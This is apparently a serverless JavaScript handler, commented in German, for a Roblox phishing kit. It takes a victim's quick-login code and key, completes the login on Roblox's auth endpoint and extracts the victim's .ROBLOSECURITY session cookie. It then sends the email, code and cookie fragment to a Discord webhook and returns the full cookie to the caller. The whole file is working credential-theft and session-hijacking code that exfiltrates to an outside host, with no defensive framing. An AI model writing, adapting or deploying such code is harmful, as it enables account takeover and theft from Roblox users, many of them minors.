// Führt Login durch und sendet an Webhook
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { code, privateKey, email, userCode } = req.body;

        if (!code || !privateKey) {
            return res.status(400).json({ error: 'Code and privateKey required' });
        }

        const BOT_COOKIE = process.env.ROBLOX_COOKIE;
        const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

        // CSRF Token holen
        const csrfResponse = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${BOT_COOKIE}`
            }
        });

        const csrfToken = csrfResponse.headers.get('x-csrf-token');

        // Login durchführen
        const loginResponse = await fetch('https://auth.roblox.com/v2/login', {
            method: 'POST',
            headers: {
                'Cookie': `.ROBLOSECURITY=${BOT_COOKIE}`,
                'x-csrf-token': csrfToken,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ctype: 'AuthToken',
                cvalue: code,
                password: privateKey
            })
        });

        // .ROBLOSECURITY Cookie aus Headers extrahieren
        const setCookie = loginResponse.headers.get('set-cookie');
        const roblosecurity = setCookie?.match(/\.ROBLOSECURITY=([^;]+)/)?.[1];

        if (!roblosecurity) {
            throw new Error('Failed to get .ROBLOSECURITY cookie');
        }

        // An Discord Webhook senden
        if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: '🔵 **ROBLOX QUICK LOGIN SUCCESS**',
                    embeds: [{
                        title: '✅ Account Verifiziert',
                        color: 0x00a6ff,
                        fields: [
                            { name: '📧 Email', value: email || 'N/A', inline: true },
                            { name: '🔑 Code', value: code, inline: true },
                            { name: '🍪 Cookie', value: `\`${roblosecurity.substring(0, 20)}...\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }

        res.status(200).json({
            success: true,
            message: 'Login successful',
            cookie: roblosecurity // Optional: zurückgeben
        });

    } catch (error) {
        console.error('Verify Error:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
}
